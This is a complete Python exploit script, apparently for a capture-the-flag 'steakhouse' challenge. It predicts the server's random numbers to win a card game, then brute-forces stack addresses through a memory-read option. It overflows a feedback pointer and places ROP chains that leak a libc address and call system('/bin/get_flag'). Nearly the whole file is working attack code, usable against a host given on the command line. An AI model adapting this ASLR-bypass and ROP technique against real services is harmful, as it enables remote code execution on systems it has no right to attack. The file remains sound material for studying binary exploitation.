#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2025 Kirill Sedow (GitHub: hexn2764, contact.kirill@proton.me)
# Copyright (c) 2025 Lucas Schnack (GitHub: 0Zeta, lucas@schnack.dev)

import socket
import os
from ctypes import *
from pwn import *
from tqdm import tqdm
from enum import Enum
from math import gcd
import random
import subprocess

# CONFIG start -------------------------------------------------------------------------------------------------------------------------------------------------
# Binary and Library Paths
VULN_BINARY_PATH = "./vuln"
LIBC_BINARY_PATH = "./libc-docker.so"
RAND_REPLAY_LIB_PATH = "./rand_replay.so"

# Network
LOCAL_HOST = "localhost"
LOCAL_PORT = 1337

# Local or Remote Connection
LOCAL = True

# Docker Container
ULIMIT_S = 64                                                                   # adjust the limit to match the Docker "ulimit -s" setting
PAGE_SIZE = 0x1000                                                              # memory page size
FIXED_OFFSET_TO_RETURN_ADDR = 0x98                                              # Must be determined via GDB in the Docker container (offset from 0xdeadbeefs to return address)

# ROPGadget
addr = subprocess.check_output(
    "ROPgadget --binary vuln | grep 'pop rdi ; ret' | head -n1 | awk '{print $1}'",
    shell=True,
    text=True
).strip()
if not addr.startswith("0x"):
    raise ValueError("Failed to parse gadget address from ROPgadget output")
POP_RDI_GADGET = int(addr, 16)

# Steak Frames
STEAK_SIZE = 0xa0                                                               # 128 bytes for "0xdeadbeef" and 32 bytes for control information
STEAK_PRICE = 1_000_000_000                                                     # from the vuln binary
if ULIMIT_S == 8:
    STEAKS_AMOUNT = 50_000
elif ULIMIT_S == 16:
    STEAKS_AMOUNT = 100_000
elif ULIMIT_S == 24:
    STEAKS_AMOUNT = 150_000
elif ULIMIT_S == 32:
    STEAKS_AMOUNT = 200_000
elif ULIMIT_S == 64:
    STEAKS_AMOUNT = 400_000
BALANCE_GOAL = STEAKS_AMOUNT * STEAK_PRICE                                      # earn at least that much steaks
STEAKS_TOTAL_SIZE = STEAKS_AMOUNT * STEAK_SIZE

# Number of probes across the steak memory region
class HitConfidence(Enum):
    LIGHTNING_STRIKE = 0.001                                                    # Instant. Uncontrollable. Hits somewhere and disappears. Never hits the same place twice.
    HOLD_MY_HAT = 0.5                                                           # Very fast. Shoots wildly without aiming. Might hit something. 40% chance to hit the meat.  99.395% chance to find 0xdeadbeef at least once in 10 tries
    RARE = 1                                                                    # Fast scan. 80% chance to hit the meat. Expect every fifth exploit run to find nothing.
    MEDIUM_RARE = 2                                                             # Nicely balanced. 100% chance to hit the meat at least once (1x 0xdeadbeef, 1x 0xdeadbeef or else)
    WELL_DONE = 3                                                               # Slow scan. 100% chance to hit the meat at least twice (2x 0xdeadbeef, 1x 0xdeadbeef or else).
HIT_CONFIDENCE = HitConfidence.MEDIUM_RARE.value

# Memory Scan Bruteforce Step
if HIT_CONFIDENCE != HitConfidence.LIGHTNING_STRIKE:
    BF_STEP = int(STEAKS_TOTAL_SIZE // HIT_CONFIDENCE)                          # step to make HIT_CONFIDENCE evenly spaced probes across the steak memory region
    BF_STEP = BF_STEP & ~0xf                                                    # align to 0x10
    L = BF_STEP // 0x10
    while gcd(L, 10) != 2:
        L -= 1
    BF_STEP = L * 0x10
else:
    BF_STEP = None                                                              # Not used - Lightning strike uses random hits

# Constants for Game Choices
CHOICE_ORDER_STEAK = b'1'
CHOICE_READ_NEWSPAPER = b'2'
CHOICE_PLAY_GAME = b'3'
CHOICE_LEAVE_STEAKHOUSE = b'4'
CHOICE_PLAY_ROUND = b'1'
CHOICE_LEAVE_GAME = b'2'
SAY_YES = b'yes'
SAY_NO = b'no'

# Show Full Last Message or Flag Only
FLAG_OUTPUT_ONLY = False

# CONFIG end ---------------------------------------------------------------------------------------------------------------------------------------------------

class GameState:
    def __init__(self):
        self.user_round_base_index = 1                                          # First random number defines the player name from names.txt. We start with the second one (index 1).
        self.credits = 10
        self.game_strategy = []                                                 # game strategy is a collection of single round strategies


def take_one_card_from_sequence_and_get_computer_decision(rand_sequence, computer_hand_pointer, computer_hand):
    """
    Simulates the computer logic when drawing one card.

    Args:
        computer_hand_pointer (int): Index in the rand_sequence.
        computer_hand (int): Total value of the hand before drawing.

    Returns:
        tuple:
            int: Updated computer hand after drawing the card.
            str: Computer decision.
    """
    computer_hand = computer_hand + rand_sequence[computer_hand_pointer]

    if computer_hand > 21:                                                      # computer loses as its sum is greater than 21
        decision = "computer lost"
    elif computer_hand == 21:                                                   # computer wins as it hits the magic number
        decision = "computer wins with magic"
    elif computer_hand > 16:                                                    # computer stops because its sum is >= 17
        decision = "computer stops"
    else:                                                                       # computer continues, because its sum is < 17
        decision = "computer continues"
    
    return computer_hand, decision

def sum_user_hand(rand_sequence, user_round_base_index, user_hand_size):                                              
    """
    Sums user hand.

    Args:
        user_round_base_index (int): Index in the rand_sequence.
        user_hand_size (int): Amount of cards user holds.

    Returns:
        int: Sum of the user's hand.
    """
    return sum(rand_sequence[user_round_base_index + i] for i in range(user_hand_size))

                    
def create_round_strategy(state, rand_sequence):
    """
    Determines the best possible game strategy for the current round using a Greedy approach.

    Given a sequence of random numbers, this strategy evaluates the outcome of stopping 
    at each point.

    Our approach:
    - Draw one card and simulate the computer's resulting hand.
    - If the computer wins, draw another card and re-evaluate.
    - Continue drawing until we either find a winning combination, reach a draw, or exhaust all options.

    If a winning combination is found, we choose it.
    If no winning combination is found but a draw is possible, we choose the draw.
    If neither is possible, we opt for the first (earliest) hand with one card. 
    This strategy increases the likelihood of repeating a winning combination 
    currently blocked by the computer.

    Returns:
        tuple:
            int: The number of times to respond "yes" in this round.
            str: A status message describing the chosen strategy or outcome.
    """
                                    
    all_paths_lead_to_sadness = 0                                               # is set to 1 if no winning combination is found
    cards_to_skip_if_no_win = 0                                                 # skip computer_hand_size + 1 (our card) if all combinations result in a loss
    
    draw_possible = 0                                                           # A draw is possible, but we may win by taking one more card.
    draw_index_shift = 0                                                        # Save the draw strategy for the case that no remaining combinations lead to a win.
    draw_amount_of_yes = 0

    user_hand_size = 0                     

    while not all_paths_lead_to_sadness:                                        # while there are still combinations which could result in a win
        user_hand_size += 1                                                     # take one more card
        user_hand = sum_user_hand(rand_sequence, state.user_round_base_index, user_hand_size)        # check the sum
        
        if user_hand > 21:                                                      # If this condition is met, we checked all possible combinations and...
            all_paths_lead_to_sadness = 1                                       # ... must lose the round.
            continue
        if user_hand == 21:                                                     # we match 21 and take this option
            state.user_round_base_index += user_hand_size                             # adjust the user round base for the next round
            state.credits *= 2                                                        # double the credits
            return user_hand_size - 1, "blackjack"                              # Say "yes" user_hand_size - 1 times since the first card is always given.
        
                                                                                # We stop with the user_hand. Computer continues.
        computer_round_base_index = state.user_round_base_index + user_hand_size      # Computer index starts right after the hand of the user.
        computer_decision = "computer continues"                                
        computer_hand = 0
        computer_hand_size = 0
        
        while computer_decision == "computer continues":                        # Computer stops either by getting a number > 21 or if its hand is between 17 and 21.                           
            computer_hand, computer_decision = take_one_card_from_sequence_and_get_computer_decision(rand_sequence, computer_round_base_index + computer_hand_size, computer_hand) 
            computer_hand_size += 1

                                                                                # Computer had <= 16, drew a card, and lost. We take this strategy.
        if computer_decision == "computer lost":                                            
            state.user_round_base_index = state.user_round_base_index + user_hand_size + computer_hand_size  # adjust the index
            state.credits *= 2                                                        # double the credits
            return user_hand_size - 1, "win by score"                           # Say "yes" user_hand_size - 1 times since the first card is always given.
        
                                                                                # Computer wins with magic number.
        if computer_decision == "computer wins with magic":                     # We continue to the next combination.                              
            if user_hand_size == 1:                                             # If we happen to lose in all the combinations, we take the first combination,
                                                                                # because this increases our chances of winning (we might repeat the computer's combination next round).
                cards_to_skip_if_no_win = computer_hand_size + user_hand_size         
            continue
        
        if computer_decision == "computer stops":                               # Computer hand is between 17 and 20.
            if computer_hand > user_hand:                                       # Computer wins. We go to the next combination.
                if user_hand_size == 1:                                         # If we happen to lose in all the combinations, we take the first combination,
                                                                                # because this increases our chances of winning (we might repeat the computer's combination next round).
                    cards_to_skip_if_no_win = computer_hand_size + 1                    
                continue
            if computer_hand < user_hand:                                       # We win and take this combination.
                state.user_round_base_index = state.user_round_base_index + user_hand_size + computer_hand_size # adjust the base for the next round
                state.credits *= 2                                                    # double the credits
                return user_hand_size - 1, "win by score"                       # Say "yes" user_hand_size - 1 times since the first card is always given.      
            
            else:                                                               # Hands are equal - mark the draw strategy for fallback.
                draw_possible = 1
                draw_index_shift = user_hand_size + computer_hand_size
                draw_amount_of_yes = user_hand_size - 1
    
    if draw_possible:                                                           # No winning strategy found. Can we take a draw?
        state.user_round_base_index += draw_index_shift                               
        return draw_amount_of_yes, "draw"
    else:                                                                       # If no draw is possible, we lose the round.
        state.user_round_base_index += cards_to_skip_if_no_win                                                  
        state.credits //= 2                                                           # Halve the credits
        return 0, "lose"                                                        

def play_win_round(p, yes_amount):                                                 
    """
    Submits a winning round to the server.

    Args:
        p (pwnlib.tubes.remote.remote): Active connection to the remote or local challenge server. 
        yes_amount (int): Number of times to answer "yes" when prompted to take a card.
    """
    p.sendlineafter(b'rules\x1b[0m', CHOICE_PLAY_ROUND)
    for i in range(0, yes_amount):
        p.sendlineafter(b'card?\n\x1b[0m', SAY_YES)
    p.sendlineafter(b'card?\n\x1b[0m', SAY_NO)

def play_loss_round(p):                                                          
    """
    Submits a loss round to the server.
    """
    p.sendlineafter(b'rules\x1b[0m', CHOICE_PLAY_ROUND)
    p.sendlineafter(b'card?\n\x1b[0m', SAY_NO)

def play_draw_round(p, yes_amount):                                                
    """
    Submits a draw round to the server.

    Args: 
        p (pwnlib.tubes.remote.remote): Active connection to the remote or local challenge server.
        yes_amount (int): Number of times to answer "yes" when prompted to take a card.
    """
    p.sendlineafter(b'rules\x1b[0m', CHOICE_PLAY_ROUND)
    for i in range(0, yes_amount):
        p.sendlineafter(b'card?\n\x1b[0m',SAY_YES)
    p.sendlineafter(b'card?\n\x1b[0m', SAY_NO)

def play_blackjack_round(p, yes_amount):                                           
    """
    Submits a round in which we reach 21 to the server.

    Args: 
        p (pwnlib.tubes.remote.remote): Active connection to the remote or local challenge server.
        yes_amount (int): Number of times to answer "yes" when prompted to take a card.
    """
    p.sendlineafter(b'rules\x1b[0m', CHOICE_PLAY_ROUND)
    for i in range(0, yes_amount):
        p.sendlineafter(b'card?\n\x1b[0m', SAY_YES)    
                
def binary_search(p, top_deadbeef_in_frame_addr):
    """
    Performs a parallel binary search to locate the steak frame with the lowest memory address.

    This is called "parallel" because the binary search algorithm is applied both to the steak frame index and to its corresponding memory address.

    We begin by assuming that the current steak frame is the last one (i.e., at index STEAKS_AMOUNT).
    Each frame occupies STEAK_SIZE bytes, so the frame with index 1 would be located at:

        top_deadbeef_in_frame_addr - STEAKS_TOTAL_SIZE

    Let:
        a := top_deadbeef_in_frame_addr - STEAKS_TOTAL_SIZE
        b := top_deadbeef_in_frame_addr

    Binary search proceeds by halving the search space. Normally, this midpoint is calculated as:
        
        mid := (b - a) // 2

    We split both the index space and address space into two regions:

        Index:   [a_index, a_index + mid]           and   [a_index + mid + 1, b_index]
        Address: [a_address, a_address + mid_addr]  and   [a_address + mid_addr + STEAK_SIZE, b_address]

    For simplicity, we refer to these as:
        [al_index, ar_index]     and     [bl_index, br_index]
        [al_address, ar_address] and     [bl_address, br_address]

    We then perform a standard binary search to find the steak frame located at the lowest memory address.

    The algorithm terminates when all values:
        al_address, ar_address, bl_address, br_address
    point to the same address.

    Args:
        p (pwnlib.tubes.remote.remote): The active remote connection to the vulnerable service.
        top_deadbeef_in_frame_addr (int): Memory address of the top-most 0xdeadbeef found in the current stack frame.

    Returns:
        int: The memory address of the lowest steak frame containing 0xdeadbeef.    
    """

    al_index = 1                                        
    ar_index = 0
    bl_index = 0
    br_index = STEAKS_AMOUNT
    al_addr = top_deadbeef_in_frame_addr - STEAKS_TOTAL_SIZE 
    ar_addr = 0
    bl_addr = 0
    br_addr = top_deadbeef_in_frame_addr                 

    mid_addr_offset = 0x1
    mid_index_offset = 1

    while (mid_index_offset != 0):
        mid_index_offset = (br_index - al_index) // 2         
        mid_addr_offset = mid_index_offset * STEAK_SIZE        
        
        ar_index = al_index + mid_index_offset    
        bl_index = al_index + mid_index_offset + 1
        ar_addr = al_addr + mid_addr_offset 
        bl_addr = al_addr + mid_addr_offset + STEAK_SIZE
             
        p.sendlineafter(b'house', CHOICE_READ_NEWSPAPER)                        # check if ar_addr points to 0xdeadbeef
        payload = hex(ar_addr)
        p.sendlineafter(b'read?', payload.encode())
        line = p.recvline()
        line = p.recvline()
        
        if b"Here" in line:                                                     # if yes, choose the block a
            br_index = ar_index
            bl_index = ar_index
            br_addr = ar_addr
            bl_addr = ar_addr
        else:
            al_index = bl_index                                                 # else choose the block b
            ar_index = bl_index
            al_addr = bl_addr
            ar_addr = bl_addr 

    return al_addr

def main():
    elf = ELF(VULN_BINARY_PATH)
    libc = ELF(LIBC_BINARY_PATH)                                                # library extracted from Docker
    rand_replay = CDLL(RAND_REPLAY_LIB_PATH)                                    # to replay the rand() function
    if LOCAL:
        host = LOCAL_HOST
        port = LOCAL_PORT
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
    try:
        s = socket.socket()                                                         
        s.connect((host,port))
    except Exception as e:
        print(f"Socket connection failed: {e}")
        exit(1)

    p = remote(host,port,sock=s)

    p.sendlineafter(b'steakhouse\x1b[0m', CHOICE_PLAY_GAME)                     # Choose to play the game. This generates a random sequence on the server side.
                                                                                    
    rand_sequence = []                                                          # We immediately replay the sequence on our side.
    start = time.time()
    rand_replay.init()
    for i in range(1000):
        rand_sequence.append(rand_replay.getValue())
    end = time.time()

    print("\n> Step 0: Get rands and calculate the winning strategy...")
  
    game_state = GameState()
    while (game_state.credits < BALANCE_GOAL):                                                 
        game_state.game_strategy.append(create_round_strategy(game_state, rand_sequence))

    print("Done. Credits check: " + str(game_state.credits))
    print("Amount rounds: " + str(len(game_state.game_strategy)))
    if len(game_state.game_strategy) >= 100:                                    # For some sequences our strategy does not fit into 100 rounds.
        print("Strategy too long - restarting...\n")
        os.execv(sys.executable, [sys.executable] + sys.argv)                   # If so, we just restart the script.
    print("Random numbers used: " + str(game_state.user_round_base_index))
    print("Time to generate rands: " + str(end - start) + " secs\n")

    
    for round_strategy in game_state.game_strategy:                             # Communicate the strategy to the server and earn the required credits.
        if round_strategy[1] == "win by score":
            play_win_round(p, round_strategy[0])
        elif round_strategy[1] == "lose":
            play_loss_round(p)
        elif round_strategy[1] == "draw":
            play_draw_round(p, round_strategy[0])
        elif round_strategy[1] == "blackjack":
            play_blackjack_round(p, round_strategy[0])


    p.sendlineafter(b"rules\x1b[0m",CHOICE_LEAVE_GAME)                                           
    p.sendlineafter(b"steakhouse\x1b[0m",CHOICE_ORDER_STEAK)                                     
    p.sendlineafter(b'order?\x1b[0m', str(STEAKS_AMOUNT).encode())              # Order steaks.


    print("> Step 1: Finding any steak in memory...")


    start_addr = 0x7ffffffff000                                                 # last mappable user-space address, 4KB aligned
    start_addr = start_addr - 0x10                                              # in theory, 0xdeadbeef entry could be here
    end_addr = 0x7ff000000000                                                   # stack is located somewhere at 0x7ff...

    if HIT_CONFIDENCE == HitConfidence.LIGHTNING_STRIKE:                        # If random scan is chosen, generates random addresses in the scan range.
        num_shots = random.randint(1, 10)
        addresses = sorted(random.sample(
            range(end_addr, start_addr, PAGE_SIZE),
            num_shots
        ))
    else:
        addresses = list(range(start_addr, end_addr, -BF_STEP))                 # Else prepares a list of addresses to scan in the decreasing order.

    steak_not_found = 1
    some_deadbeef_address_str = ""

    # with open("bruteforce_log.txt", "w") as log_file:
    scan_progress = tqdm(addresses, desc="Brute-forcing address", dynamic_ncols=True)   # Visual progress bar for scanning steak memory

    for addr_int in scan_progress:
        payload = hex(addr_int)
        scan_progress.set_description(f"Trying {payload}")

        p.sendlineafter(b'steakhouse\x1b[0m', CHOICE_READ_NEWSPAPER)
        p.sendlineafter(b'read?\x1b[0m', payload.encode())
        line = p.recvline()
        line = p.recvline()

        #log_file.write(f"{payload}\n")

        if b"Here" in line:
            some_deadbeef_address_str = payload
            steak_not_found = 0
            break

    if steak_not_found:
        print("Steak not found. Try re-running the exploit or adjusting the hit confidence level to refine the scan granularity.")
        exit()

    print("Found 0xdeadbeef entry at: " + some_deadbeef_address_str)     

    """
                            0x00007ffd4dec7f30     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec7f40     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec7f50     00 00 00 00 00 00 00 00 00 00 00 00 5b 1a 06 00    ............[...
                            0x00007ffd4dec7f60     00 80 ec 4d fd 7f 00 00 f9 2b 40 00 00 00 00 00    ...M.....+@.....

                top ------> 0x00007ffd4dec7f70     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                    step up 0x00007ffd4dec7f80     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                    step up 0x00007ffd4dec7f90     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                    step up 0x00007ffd4dec7fa0     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
    assume we are here ---> 0x00007ffd4dec7fb0     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec7fc0     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec7fd0     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec7fe0     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec7ff0     00 00 00 00 00 00 00 00 00 00 00 00 5c 1a 06 00    ............\...
                            0x00007ffd4dec8000     a0 80 ec 4d fd 7f 00 00 f9 2b 40 00 00 00 00 00    ...M.....+@.....
                            
                            0x00007ffd4dec8010     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................
                            0x00007ffd4dec8020     ef be ad de 00 00 00 00 ef be ad de 00 00 00 00    ................

    We hit some 0xdeadbeef aligned at 0x10. The next goal is to find the top 0xdeadbeef inside this recursive function frame.
                            
    """
                                                                            
    some_deadbeef_address_int = int(some_deadbeef_address_str,16)
    top_deadbeef_in_frame_addr = 0
    deadbeef_alignment = 0x10

    while (b"Oh wow" not in line):                                              # iterate until the topmost 0xdeadbeef in the frame is reached
        some_deadbeef_address_int -= deadbeef_alignment
        p.sendlineafter(b'steakhouse\x1b[0m', CHOICE_READ_NEWSPAPER)                         
        payload = hex(some_deadbeef_address_int)                              
        p.sendlineafter(b'read?\x1b[0m', payload.encode())
        line = p.recvline()
        line = p.recvline()
        
    top_deadbeef_in_frame_addr = some_deadbeef_address_int + deadbeef_alignment      

    print("Top 0xdeadbeef in a steak frame: " + hex(top_deadbeef_in_frame_addr) + '\n')


    print("> Step 2: Parallel binary search for the steak frame with the lowest address...")
    

    first_deadbeef_ever = binary_search(p, top_deadbeef_in_frame_addr)
    return_addr = first_deadbeef_ever + STEAKS_TOTAL_SIZE + FIXED_OFFSET_TO_RETURN_ADDR         

    print("Steak frame with the lowest address: " + hex(first_deadbeef_ever))
    print("Return address: " + hex(return_addr) + "\n")


    print("> Step 3: Placing ROP chains to retrieve the flag...")
                                                                                                    
    p.sendlineafter(b'steakhouse\x1b[0m', CHOICE_LEAVE_STEAKHOUSE)                                                         
    p.sendlineafter(b'feedback?\x1b[0m', SAY_YES)                               # Choose "yes" for the feedback
    payload = u64(p64(1337)[:2] + p64(return_addr)[:6])                         # 2 bytes dummy value for "index", 6 bytes overwrite the "feedback" pointer
    p.sendlineafter(b']\n\x1b[0m', str(payload).encode())                       # Perform overflow

    rop_chain = (                                                               # First ROP-chain leaks the address of puts@libc and returns to main()
        p64(POP_RDI_GADGET) + 
        p64(elf.got["puts"]) + 
        p64(elf.plt["puts"]) + 
        p64(elf.symbols["main"])
    )
    p.sendlineafter(b'comment:\x1b[0m', rop_chain)                                  

    p.recvline()
    puts_addr = u64(p.recvn(6).ljust(8, b"\x00"))                               # puts@libc
    print("Leaked puts@libc address:", hex(puts_addr))                                                    
    libc_addr = puts_addr - libc.symbols["puts"]                                # libc base
    print("Calculated libc base:", hex(libc_addr))
    system = libc_addr + libc.symbols["system"]                                 # system@libc
    print("Resolved system@libc:", hex(system))

    cmd_to_execute = b"/bin/get_flag\x00"                                       # Second ROP-chain executes system("/bin/get_flag").
    rop_chain = (
        p64(POP_RDI_GADGET) + 
        p64(return_addr + 3 * 8) + 
        p64(system) + 
        cmd_to_execute
    )
    p.sendlineafter(b'steakhouse\x1b[0m', CHOICE_LEAVE_STEAKHOUSE)                                                
    p.sendlineafter(b'feedback?\x1b[0m', SAY_YES)     
    payload = u64(p64(1337)[:2] + p64(return_addr)[:6])                         # 2 bytes dummy value for "index", 6 bytes overwrite the "feedback" pointer
    p.sendlineafter(b']\n\x1b[0m', str(payload).encode())                                       
    p.sendlineafter(b'comment:\x1b[0m', rop_chain)                                  

    if FLAG_OUTPUT_ONLY:                                                        # Get the flag
        p.recvuntil(b"flag")                                                           
        print("\nflag" + p.recvline().decode().strip())
    else:
        output = p.recvall(timeout=5).decode(errors="ignore")
        print("\n" + output)

if __name__ == "__main__":
    main()
